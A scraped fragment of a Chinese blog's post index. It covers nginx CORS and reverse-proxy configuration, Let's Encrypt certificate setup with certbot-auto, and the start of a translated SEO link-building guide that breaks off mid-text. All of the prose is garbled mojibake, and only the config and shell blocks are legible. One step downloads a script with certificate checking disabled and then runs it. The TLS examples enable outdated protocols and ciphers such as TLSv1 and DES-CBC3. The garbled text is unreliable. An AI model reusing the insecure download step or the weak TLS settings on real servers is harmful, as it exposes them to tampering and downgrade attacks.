Serverè§£æ±ºï¼Œä¹Ÿå¯ä»¥åœ¨æºç¢¼å±¤è§£æ±ºã€‚å› ç‚ºå•é¡Œæ¯”è¼ƒæ™®éï¼Œæ•…æˆ‘å€‘é¸æ“‡åœ¨Web Serverè§£æ±ºï¼Œä¸‹é¢æˆ‘å€‘ä»¥ Nginx ç‚ºä¾‹ï¼Œèªªæ˜è§£æ±ºæ–¹æ¡ˆã€‚ å‡è¨­è¨ªå•çš„åœ°å€ç‚º /example , Nginx é…ç½®å¦‚ä¸‹: 1 2 3 4 5 6 7 location /example { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } ç‚ºäº†è§£æ±ºè·¨åŸŸå•é¡Œï¼Œæ·»åŠ å¦‚ä¸‹å…§å®¹: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 location /example { + if ($request_method = \u0026#39;OPTIONS\u0026#39;) { + add_header Access-Control-Allow-Origin *; + add_header Access-Control-Max-Age 1728000; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; + add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; + add_header Content-Length 0 ; + return 204; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } èªªæ˜ï¼š if ($request_method = 'OPTIONS') {...} ç•¶è«‹æ±‚æ–¹æ³•ç‚º OPTIONS æ™‚:\næ·»åŠ å…è¨±æº Access-Control-Allow-Origin ç‚º * (å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹) æ·»åŠ ç·©å­˜æ™‚é•· Access-Control-Max-Ageï¼Œç•¶ä¸‹æ¬¡è«‹æ±‚æ™‚ï¼Œç„¡éœ€å†ç™¼é€ OPTIONS è«‹æ±‚ æ·»åŠ å…è¨±çš„æ–¹æ³•ï¼Œå…è¨±çš„é¦–éƒ¨ æ·»åŠ ä¸€å€‹å…§å®¹é•·åº¦ç‚º0ï¼Œé¡å‹ç‚º text/plain; charset=utf-8 , è¿”å›ç‹€æ…‹ç¢¼ç‚º 204 çš„é¦–éƒ¨ è‡³æ­¤ï¼Œå®Œæˆ OPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ã€‚\nè·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ æ·»åŠ å¦‚ä¸‹å…§å®¹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 location /example { if ($request_method = \u0026#39;OPTIONS\u0026#39;) { add_header Access-Control-Allow-Origin *; add_header Access-Control-Max-Age 1728000; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; add_header Content-Length 0 ; return 204; } + if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) { + add_header Access-Control-Allow-Origin $http_origin; + add_header Access-Control-Allow-Credentials true; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Expose-Headers Content-Length,Content-Range; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } èªªæ˜ï¼š if ($http_origin ~* (https?://(.+\\.)?(example\\.com$))) {...}ï¼Œç•¶ origin ç‚ºåˆæ³•åŸŸå(å¯æ ¹æ“šæ¥­å‹™èª¿æ•´æˆ–å»é™¤åˆæ³•åŸŸåé©—è­‰)æ™‚:\næ·»åŠ å…è¨±æº Access-Control-Allow-Origin ç‚º $http_origin (å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹) æ·»åŠ å…è¨±èªè­‰ Access-Control-Allow-Credentials ç‚º true ï¼Œå…è¨±æ¥æ”¶å®¢æˆ¶ç«¯ Cookie(å¯æ ¹æ“šæ¥­å‹™éœ€è¦æ›´æ”¹ã€‚ ä½†è¦æ³¨æ„ï¼Œç•¶è¨­ç½®ç‚ºtrueæ™‚ï¼ŒAccess-Control-Allow-Origin ä¸å…è¨±è¨­ç½®ç‚º *) æ·»åŠ å…è¨±çš„æ–¹æ³•ï¼Œæš´éœ²çš„é¦–éƒ¨ è‡³æ­¤ï¼Œå®Œæˆè·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ã€‚\nä»¥ä¸Šï¼Œæ˜¯å°è·¨åŸŸè«‹æ±‚åœ¨Web Serverçš„è§£æ±ºæ–¹æ¡ˆï¼Œä¸»è¦æ˜¯é€šééŸ¿æ‡‰ OPTIONS æ–¹æ³•å’Œæ·»åŠ å…è¨±æºä¾†è§£æ±ºã€‚\nç•¶ç„¶ï¼Œå¦‚æœæœ¬åœ°é–‹ç™¼ä¸­ï¼Œå¯ä»¥åœ¨åˆ©ç”¨ webpack-dev-server çš„ proxy é¸é …ä¾†å¿«é€Ÿè§£æ±ºè·¨åŸŸå•é¡Œï¼š\nç¤ºä¾‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 // webpack.congf.js module.exports = { //... devServer: { proxy: { \u0026#39;/api\u0026#39;: { target: \u0026#39;http://localhost:3000\u0026#39;, pathRewrite: {\u0026#39;^/api\u0026#39; : \u0026#39;\u0026#39;} } } } } ç•¶è¨ªå•åœ°å€å¦‚ /api/foo?q=bar æ™‚ï¼Œå‰‡é€šéä»£ç†è¨ªå•çš„å¯¦éš›åœ°å€æ˜¯: http://localhost:3000/foo?q=barã€‚\nNginxåå‘ä»£ç† nginxåå‘ä»£ç†ï¼Œé€šéä¿®æ”¹nginxé…ç½®æª”æ¡ˆå¯¦ç¾åå‘ä»£ç†ï¼Œè«‹æ±‚çµ±ä¸€é€šénginxåˆ†ç™¼è«‹æ±‚\nNginxé…ç½®ï¼ˆ192.168.75.139ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # è² è¼‰å‡è¡¡ upstream my_site { server 192.168.75.138:8080; server 192.168.75.137:8080; server 192.168.75.136:8080; } server { listen 8081; server_name localhost; location ^~ /api/ { proxy_pass http://my_site/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location = / { proxy_pass http://my_site/nginx/indexNginxCrossQuest.jsp; } location = /nginx/ { proxy_pass http://my_site/nginx/; proxy_set_header Host $host; proxy_set_header X-Real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } location ~ \\.(html|htm|ico|png|jpg|jpeg|js|css|bmp)$ { proxy_pass http://my_site; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } ç€è¦½å™¨è«‹æ±‚ï¼ˆ192.168.75.1ï¼‰ ç¶œåˆå°æ¯” CORS Nginxåå‘ä»£ç† å‰ç«¯ç¨‹å¼ç¢¼é…ç½® credentials=true ç„¡ å¾Œç«¯ç¨‹å¼ç¢¼é…ç½® setHeaderï¼šAllow-Originã€Allow-Methodsç­‰ ç„¡ æœå‹™ç«¯é…ç½® ç„¡ Nginxé…ç½® ç§»æ¤éˆæ´»æ€§ é«˜ã€ç„¡é¡å¤–é…ç½® ä½ã€æ¯å¢åŠ ä¸€å€‹ç’°å¢ƒéƒ½éœ€è¦å¢åŠ é…ç½® å®‰å…¨æ€§ é«˜ã€ä¾†æºå¯æ§ã€ç›´æ¥è¿½æº¯ X-Forwarded-Forè¿½æº¯å¤šç´šä¾†æº å®‰å…¨æ§åˆ¶ é»‘ç™½åå–® æ›´æ–°é…ç½® ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305241864_c3ef911be4_o.jpg","permalink":"https://wayneblog.ga/2022-08-23/nginx-cors-and-reverse-proxy/","title":"nginx CORS è·¨åŸŸèˆ‡åå‘ä»£ç†"},{"content":" åƒè€ƒæ–‡ç«  IT Note SSLæ†‘è­‰æ•™å­¸ - xoops å…è²»SSLæ†‘è­‰ç”³è«‹ nginx configç”¢ç”Ÿå™¨ Qualys çš„ SSL ä¼ºæœå™¨æ¸¬è©¦å·¥å…· ç‰ˆæœ¬ä¸€ æ­¥é©Ÿ 1 - ä¸‹è¼‰å®‰è£åŠåŸ·è¡Œçš„è…³æœ¬ 1 2 3 wget https://dl.eff.org/certbot-auto --no-check-certificate chmod +x ./certbot-auto ./certbot-auto -n ç”Ÿæˆè­‰æ›¸ï¼Œåªéœ€è¦è¼¸å…¥éƒµä»¶åœ°å€å’Œç¶²ç«™æ ¹ç›®éŒ„ï¼Œæç¤ºä»¥ä¸‹å…§å®¹ï¼Œèªªæ˜å®‰è£å®Œæˆ 1 2 3 Saving debug log to /var/log/letsencrypt/letsencrypt.log Missing command line flags. For non-interactive execution, you will need to specify a plugin on the command line. Run with \u0026#39;--help plugins\u0026#39; to see a list of options, and see https://eff.org/letsencrypt-plugins for more detail on what the plugins do and how to use them. æ­¥é©Ÿ 2 - nginxè¨­å®šéš±è—ç›®éŒ„è¨ªå• 1 2 3 location ~ /.well-known { allow all; } æ­¥é©Ÿ 3 - ç”ŸæˆåŸŸåè­‰æ›¸ 1 ./certbot-auto certonly --email tony@hack.idv.tw --agree-tos --no-eff-email --webroot -w /var/www/ -d hack.idv.tw åˆ°ç›®éŒ„å…§æŸ¥çœ‹ 1 cd /etc/letsencrypt/live/ è¬ç”¨å­—å…ƒçš„ç”³è«‹æŒ‡ä»¤ (éœ€è¦é©—è­‰dns) 1 certbot-auto certonly -d *.manpc.tk --manual --preferred-challenges dns æ­¥é©Ÿ 4 - è¨­å®šnginx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 server { listen 80; # IPv4 listen [::]:80; server_name hack.idv.tw ; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; #rewrite ^(.*) https://$host$1 permanent; return 301 https://www.itnotetk.com$request_uri; #è·³è½‰åˆ°Https } server { listen 443 ssl http2; server_name hack.idv.tw ; ssl on; ssl_certificate /etc/letsencrypt/live/hack.idv.tw/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/hack.idv.tw/privkey.pem; client_max_body_size 256m; ssl_dhparam /etc/nginx/certs/dhparam.pem; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_stapling on; ssl_ciphers \u0026#34;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA\u0026#34;; ssl_prefer_server_ciphers on; #add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubdomains; preload\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubDomains;preload\u0026#34; always; # ... Let\u0026rsquo;s Encryptæ†‘è­‰åªæœ‰90å¤© éœ€è¦æ‰‹å‹•çºŒç´„ 1 0 1 * * * /root/certbot-auto renew --disable-hook-validation --renew-hook \u0026#34;/etc/init.d/nginx reload\u0026#34; ç‰ˆæœ¬äºŒ ç¶²è·¯å‡ºè™•\nLetâ€™s Encrypt æ˜¯ä¸€å®¶æ–°çš„è­‰æ›¸é ’ç™¼æ©Ÿæ§‹ï¼ˆCertificate Authorityï¼Œç°¡ç¨± CAï¼‰ï¼Œå…¶æä¾›å…è²»çš„ TLS/SSL æ†‘è­‰å†é…åˆ Certbot é€™å€‹è‡ªå‹•åŒ–å·¥å…·ï¼Œè®“ä¸€èˆ¬çš„ç¶²ç«™å¯ä»¥å¾ˆå®¹æ˜“åœ°ä½¿ç”¨ HTTPS çš„å®‰å…¨åŠ å¯†ç¶²é ï¼Œè¨­å®šå¾ˆç°¡å–®ï¼Œæ†‘è­‰çš„æ›´æ–°ä¹Ÿå¯ä»¥è‡ªå‹•è™•ç†ã€‚ ä»¥ä¸‹æˆ‘ä»¥ Ubuntu Linux 14.04 çš„ç³»çµ±ç‚ºä¾‹ï¼Œç¤ºç¯„ nginx ä¼ºæœå™¨ä½¿ç”¨ Letâ€™s Encrypt æ†‘è­‰è¨­å®š HTTPS å®‰å…¨åŠ å¯†ç¶²é çš„æ–¹æ³•ã€‚ æ­¥é©Ÿ 1 - å¾ Certbot å®˜æ–¹ç¶²ç«™ä¸‹è¼‰ certbot-auto æŒ‡ä»¤ç¨¿ï¼Œä¸¦è¨­å®šå…¶åŸ·è¡Œæ¬Šé™ 1 2 wget https://dl.eff.org/certbot-auto chmod a+x certbot-auto certbot-auto è¦æ”¾åœ¨å“ªè£¡éƒ½å¯ä»¥ï¼Œå»ºè­°ä¸€é–‹å§‹å°±æ‰¾ä¸€å€‹é©åˆçš„åœ°æ–¹æ”¾å¥½ï¼Œä¾‹å¦‚å»ºç«‹ä¸€å€‹ /opt/letsencrypt ç›®éŒ„ï¼ŒæŠŠ certbot-auto æ”¾åœ¨é€™è£¡ 1 2 mkdir /opt/letsencrypt mv certbot-auto /opt/letsencrypt/ æ­¥é©Ÿ 2 - åŸ·è¡Œ certbot-auto ï¼Œè®“å®ƒè‡ªå‹•å®‰è£æ‰€æœ‰ç›¸ä¾å¥—ä»¶ 1 /opt/letsencrypt/certbot-auto åŸ·è¡Œ certbot-auto æ™‚ï¼Œæœƒéœ€è¦è¼¸å…¥å¯†ç¢¼å–å¾— root æ¬Šé™ æ­¥é©Ÿ 3ï¼š å®‰è£å®Œæˆæ‰€æœ‰éœ€è¦çš„ç³»çµ±å¥—ä»¶å¾Œï¼Œæ¥è‘—æˆ‘å€‘è¦é€é webroot çš„æ–¹å¼ï¼Œä½¿ç”¨æ—¢æœ‰çš„ nginx ç¶²é ä¼ºæœå™¨ä¾†å‘ Letâ€™s Encrypt å–å¾—æ†‘è­‰ï¼Œè€Œåœ¨èªè­‰çš„éç¨‹æœƒéœ€è¦åœ¨ç¶²é æ ¹ç›®éŒ„ä¸­å»ºç«‹ä¸€å€‹ .well-known/acme-challenge/ ç›®éŒ„ï¼Œè®“ Letâ€™s Encrypt çš„ä¼ºæœå™¨ä¾†è®€å–å…¶ä¸­çš„å…§å®¹ã€‚ ä¸€èˆ¬çš„ nginx ä¼ºæœå™¨é€šå¸¸æœƒè¨­å®šæŠŠå¥é»é–‹é ­çš„éš±è—æª”æ¡ˆéƒ½æ“‹æ‰ï¼Œé‡åˆ°é€™æ¨£çš„ç‹€æ³å°±æœƒç„¡æ³•é€²è¡Œèªè­‰ï¼Œé€™æ™‚å€™å¯ä»¥å†åŠ ä¸€å°æ®µè¨­å®šï¼Œè®“ .well-known/acme-challenge/ ç›®éŒ„å¯ä»¥è¢«æ­£å¸¸è®€å–ã€‚ 1 2 3 4 5 6 location ^~ /.well-known/acme-challenge/ { # the usual settings } location ~ /\\. { deny all; } æ­¥é©Ÿ 4 - ä½¿ç”¨ certonly åŠŸèƒ½ä¸‹è¼‰æ†‘è­‰ 1 /opt/letsencrypt/certbot-auto certonly --webroot -w /var/www/blog.gtwang.org/ -d blog.gtwang.org -d gtwang.org æ­¥é©Ÿ 5 - è¼¸å…¥è‡ªå·±çš„ Email ä¿¡ç®± æ­¥é©Ÿ 6 - é–±è®€ä½¿ç”¨æ¢æ¬¾ï¼Œé¸æ“‡ã€ŒAgreeã€ç¹¼çºŒ æ­¥é©Ÿ 7 - ä¸‹è¼‰å®Œæˆå¾Œï¼Œæœƒå‡ºç¾é¡ä¼¼é€™æ¨£çš„æˆåŠŸè¨Šæ¯ 1 2 3 4 5 6 7 8 IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem. Your cert will expire on 2016-08-13. To obtain a new version of the certificate in the future, simply run Certbot again. - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let\u0026#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le é€™æ¨£å°±æˆåŠŸå–å¾— Letâ€™s Encrypt çš„æ†‘è­‰äº†ï¼Œè€Œ nginx ç”¨çš„æ†‘è­‰å°±å„²å­˜åœ¨ /etc/letsencrypt/live/blog.gtwang.org/ ç›®éŒ„ä¹‹ä¸‹ï¼Œå…¶ä¸­ fullchain.pem å°±æ˜¯ nginx éœ€è¦æ†‘è­‰ï¼Œè€Œ privkey.pem å‰‡æ˜¯éœ€è¦ä¿è­·å¥½çš„ç§é‘°ï¼Œé—œæ–¼æ†‘è­‰æª”æ¡ˆçš„è©³ç´°èªªæ˜ï¼Œè«‹åƒè€ƒ Certbot çš„èªªæ˜æ–‡ä»¶ã€‚ Certbot é‚„æœ‰æä¾›å¦å¤–ä¸€å€‹ standalone çš„æ–¹å¼ä¾†å‘ Letâ€™s Encrypt å–å¾—æ†‘è­‰ï¼Œé€™ç¨®æ–¹å¼æ˜¯ç”± Certbot å»ºç«‹ä¸€å€‹ç¨ç«‹çš„ç¶²é ä¼ºæœå™¨ï¼Œæä¾› Letâ€™s Encrypt è®€å–é©—è­‰ç”¨çš„è³‡æ–™ï¼Œä¸éé€™æ¨£çš„åšæ³•éœ€è¦ç¶å®š 80 æˆ– 443 é€£æ¥åŸ ï¼Œæ‰€ä»¥é€šå¸¸é‚„æœƒéœ€è¦æš«åœæ—¢æœ‰çš„ç¶²é ä¼ºæœå™¨ï¼Œå°æ–¼ä¸€èˆ¬çš„ç¶²ç«™è€Œè¨€ï¼Œæœƒé€ æˆç¶²ç«™æœ‰å¹¾ç§’é˜çš„æ–·ç·šç¾è±¡ï¼Œæ‰€ä»¥æˆ‘å€‹äººä¸å–œæ­¡é€™æ¨£çš„æ–¹å¼ã€‚ æ¥ä¸‹ä¾†è¦è¨­å®š nginx ä¼ºæœå™¨ï¼Œä½¿ç”¨é€™å€‹æ–°æ†‘è­‰ä¾†æä¾› HTTPS çš„å®‰å…¨åŠ å¯†ç¶²é ã€‚ æ­¥é©Ÿ 8 - è¦è®“ nginx å•Ÿç”¨ HTTPS å®‰å…¨åŠ å¯†ç¶²é ï¼Œåªè¦åŠ ä¸Š SSL ç›¸é—œçš„å¹¾è¡Œè¨­å®šå³å¯ï¼Œå…¶é¤˜çš„è¨­å®šä¿æŒä¸è®Šï¼Œä»¥ä¸‹æ˜¯æˆ‘å€‹äººä½¿ç”¨çš„ nginx ä¼ºæœå™¨è¨­å®š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 server { # å‚¾è½ HTTPS æ¨™æº–åŸ è™Ÿ 443 listen 443; # åŒæ™‚å•Ÿç”¨ IPv6 çš„ HTTPS å®‰å…¨åŠ å¯†ç¶²é  listen [::]:443; server_name blog.gtwang.org; root /var/www/blog.gtwang.org/; index index.php index.html index.htm; # å•Ÿç”¨ SSL ssl on; # è¨­å®š SSL æ†‘è­‰ ssl_certificate /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.gtwang.org/privkey.pem; # å…¶ä»– SSL é¸é … ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # omit SSLv3 because of POODLE (CVE-2014-3566) ssl_ciphers \u0026#39;ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;; ssl_prefer_server_ciphers on; # ... } ssl_protocols çš„éƒ¨åˆ†è¨˜å¾—è¦ æŠŠSSLv3æ‹¿æ‰ ï¼Œé¿å… POODLE æ”»æ“Šï¼ˆCVE-2014-3566ï¼‰ã€‚ æ­¥é©Ÿ 9 - è¨­å®šå¥½ä¹‹å¾Œï¼Œæª¢æŸ¥ä¸€ä¸‹è¨­å®šæª”æ˜¯å¦æ­£ç¢º 1 service nginx configtest æ­¥é©Ÿ 10 - ç¢ºèªç„¡èª¤ä¹‹å¾Œï¼Œé‡æ–°è¼‰å…¥è¨­å®šæª” 1 service nginx reload é€™æ¨£å°±å®Œæˆ nginx ä¼ºæœå™¨çš„è¨­å®šäº†ï¼Œæ¥è‘—å°±å¯ä»¥é–‹å•Ÿ HTTPS åŠ å¯†çš„ç¶²å€ä¾†æ¸¬è©¦äº†ï¼Œæ­£å¸¸ä¾†èªªï¼Œä½¿ç”¨ Google Chrome ç€è¦½å™¨é–‹å•Ÿè‡ªå·±ä¸»æ©Ÿçš„ HTTPS åŠ å¯†ç¶²å€ï¼Œæ‡‰è©²å°±æœƒé¡¯ç¤ºä¸€å€‹ç¶ è‰²çš„é–é ­ï¼Œé€™æ¨£å°±ä»£è¡¨æˆ‘å€‘å®‰è£çš„ SSL æ†‘è­‰æ˜¯æœ‰æ•ˆçš„ã€‚ Letâ€™s Encrypt çš„æ†‘è­‰ä½¿ç”¨æœŸé™åªæœ‰ä¸‰å€‹æœˆï¼Œåœ¨æ†‘è­‰åˆ°æœŸå‰çš„ä¸€å€‹æœˆå¯ä»¥ä½¿ç”¨ certbot-auto ä¾†æ›´æ–°æ†‘è­‰ï¼Œåœ¨å¯¦éš›æ›´æ–°ä¹‹å‰æˆ‘å€‘å¯ä»¥åŠ å…¥ --dry-run åƒæ•¸ï¼Œå…ˆé€²è¡Œæ¸¬è©¦ã€‚ 1 /opt/letsencrypt/certbot-auto renew --dry-run è‹¥æ¸¬è©¦æ²’å•é¡Œï¼Œå°±å¯ä»¥ä½¿ç”¨æ­£å¼æŒ‡ä»¤ä¾†æ›´æ–° 1 /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade è€Œç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œå¯ä»¥å°‡é€™å€‹æ›´æ–°æŒ‡ä»¤å¯«åœ¨ /opt/letsencrypt/renew.sh æŒ‡ä»¤ç¨¿ä¸­ 1 2 #!/bin/sh /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade --post-hook \u0026#34;service nginx reload\u0026#34; é€™è£¡æˆ‘åˆåŠ ä¸Šä¸€å€‹ --post-hook çš„è¨­å®šï¼Œè®“æ†‘è­‰æ›´æ–°å®Œå¾Œï¼Œå¯ä»¥è‡ªå‹•é‡æ–°è¼‰å…¥ nginx ä¼ºæœå™¨çš„è¨­å®šï¼Œè®“æ†‘è­‰ç”Ÿæ•ˆã€‚\næ¥è‘—æŠŠé€™å€‹ /opt/letsencrypt/renew.sh æŒ‡ä»¤ç¨¿å¯«é€² crontab ä¸­\n1 2 # m h dom mon dow command 30 2 * * 0 /opt/letsencrypt/renew.sh å®˜æ–¹çš„å»ºè­°æ˜¯é€™å€‹æŒ‡ä»¤å¯ä»¥ä¸€å¤©åŸ·è¡Œå…©æ¬¡ï¼Œè®“ä¼ºæœå™¨çš„æ†‘è­‰éš¨æ™‚ä¿æŒåœ¨æœ€æ–°çš„ç‹€æ…‹ï¼Œé€™è£¡æˆ‘æ˜¯è¨­å®šè®“ä¼ºæœå™¨æ¯é€±æ—¥å‡Œæ™¨å…©é»åŠé€²è¡Œæ†‘è­‰çš„æª¢æŸ¥èˆ‡æ›´æ–°ï¼ŒCertbot åªæœ‰åœ¨æ†‘è­‰åˆ°æœŸå‰ä¸€å€‹æœˆæ‰æœƒé€²è¡Œæ›´æ–°ï¼Œå¦‚æœæ†‘è­‰å°šæœªåˆ°æœŸï¼Œå°±ä¸æœƒæ›´æ–° ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305205270_220313b3c4_o.png","permalink":"https://wayneblog.ga/2022-08-23/nginx-ssl-with-lets-encrypt/","title":"nginx è¨­å®š ssl ï¼‹ è‡ªå‹•çºŒç´„ Letâ€™s Encrypt å…è²»åŸŸåè­‰æ›¸"},{"content":" æœ¬æ–‡ç¿»è­¯è‡ªï¼šLINK BUILDING FOR SEO:The Definitive Guide (2022)\né€™æ˜¯ä¸€ç¯‡å®Œæ•´çš„ 2022 å¹´é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå› æ­¤ï¼Œå¦‚æœä½ æƒ³è¦å–å¾—æ¬Šå¨ç¶²ç«™çš„åå‘é€£çµã€‚\nä½ å°‡æœƒåœ¨é€™ç¯‡æ–°æŒ‡å—ä¸­ï¼Œäº«å—æœ¬æ–‡å¯æ“ä½œçš„æŠ€å·§ã€‚\nè®“æˆ‘å€‘å¾€æ·±å…¥å…¶ä¸­å§ã€‚\nç¬¬ 1 ç« ï¼šé€£çµå„ªåŒ–åŸºç¤ åœ¨æœ¬ç« ç¯€ï¼Œæˆ‘å°‡å‘ä½ è§£ç­”æ­¤å•é¡Œï¼šã€Œä»€éº¼æ˜¯é€£çµå»ºç«‹ï¼Ÿã€\nåŒæ™‚ï¼Œæˆ‘ä¹Ÿæœƒå‘ä½ å±•ç¾ç‚ºä½•é€£çµå»ºç«‹ï¼Œåœ¨ 2022 å¹´çš„ä»Šå¤©ä»ç„¶å¾ˆé‡è¦ã€‚\nè®“æˆ‘å€‘é–‹å§‹å§ï¼\nä»€éº¼æ˜¯é€£çµå»ºç«‹ï¼Ÿ ã€Œé€£çµå»ºç«‹ã€æ˜¯ä¸€ç¨®æ‰“é€ å–®å‘è¶…é€£çµï¼ˆåˆååå‘é€£ç¯€ï¼‰ï¼Œåˆ°å¦ä¸€å€‹ç¶²ç«™çš„æ–¹æ³•ã€‚\nå¸Œæœ›è—‰æ­¤æ”¹å–„ç¶²ç«™çš„æœå°‹å¼•æ“èƒ½è¦‹åº¦ã€‚\nå¸¸è¦‹çš„é€£çµå„ªåŒ–ç­–ç•¥åŒ…å«å…§å®¹è¡ŒéŠ·ã€å»ºç«‹æœ‰ç”¨çš„å·¥å…·ã€é›»å­éƒµä»¶æ¨å»£ã€ç ´æé€£çµå„ªåŒ–èˆ‡å…¬å…±é—œä¿‚ã€‚\nç‚ºä»€éº¼é€£çµé€™éº¼é‡è¦ï¼Ÿ è‹¥è¦ç†è§£å®ƒï¼Œä½ å°‡éœ€è¦è·³ä¸Šæ™‚å…‰æ©Ÿï¼Œä¸¦é‡è¿”æ—©æœŸç¶²è·¯æ™‚ä»£çš„ Google ã€‚\nåœ¨éå»çš„æ—¥å­ï¼Œæœå°‹å¼•æ“å¦‚ Yahooï¼èˆ‡ Alta Vista æ˜¯ä¸»è¦æ”¯é…è€…ã€‚\nä»–å€‘æ’åºæœå°‹çµæœçš„æ–¹å¼ï¼Œ100% æ˜¯åŸºæ–¼ç¶²é ä¸Šçš„å…§å®¹\nè¼¸å…¥ï¼šGoogle\nç¾ä»Šä»–å€‘çŸ¥åçš„ PageRank æ¼”ç®—æ³•æ”¹è®Šäº†é€™å ´éŠæˆ²ã€‚\nGoogle ä¸æ˜¯å–®ç´”åˆ†æç¶²é çš„å…§å®¹ï¼Œè€Œæ˜¯æŸ¥çœ‹æœ‰å¤šå°‘äººé€£çµåˆ°è©²é é¢ã€‚\nè€Œä»–å€‘æ˜¯æ­£ç¢ºçš„ã€‚\nåœ¨æ¥è¿‘ 20 å¹´ä»¥å¾Œï¼Œé€£çµä»ç„¶æ˜¯è¡¡é‡ç¶²é å“è³ªçš„æœ€å¥½æ–¹æ³•ã€‚\né€™å°±æ˜¯ç‚ºä½• Google ä»ç„¶å°‡åå‘é€£ç¯€è¦–ç‚ºæ’åçš„ä¿¡è™Ÿä¹‹ä¸€ã€‚\næ­¤å¤–ï¼Œç”±æ–¼ä¼éµæ¼”è¬æ³•çš„æ›´æ–°ï¼ŒGoogle 